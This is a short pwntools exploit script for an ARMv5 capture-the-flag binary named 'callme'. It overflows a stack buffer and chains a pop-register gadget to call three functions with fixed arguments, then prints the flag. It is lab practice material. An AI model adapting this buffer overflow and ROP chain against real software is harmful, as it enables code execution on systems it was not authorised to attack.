from pwn import *

callme_one = 0x00010618
callme_two = 0x0001066c
callme_three = 0x0001060c
pop_r0_r1_r2_lr_pc = 0x00010870

payload = b"".join([
    b"A"*(32+4),
    p32(pop_r0_r1_r2_lr_pc),
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
    p32(pop_r0_r1_r2_lr_pc),
    p32(callme_one),
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
    p32(pop_r0_r1_r2_lr_pc),
    p32(callme_two),
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
    p32(pop_r0_r1_r2_lr_pc),
    p32(callme_three),
])

#p = process(["qemu-arm", "-g", "1234", "./callme_armv5"])
p = process("./callme_armv5")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"correctly\n")
p.recvuntil(b"correctly\n")
flag = p.recv()
print(f"Flag : {flag}")
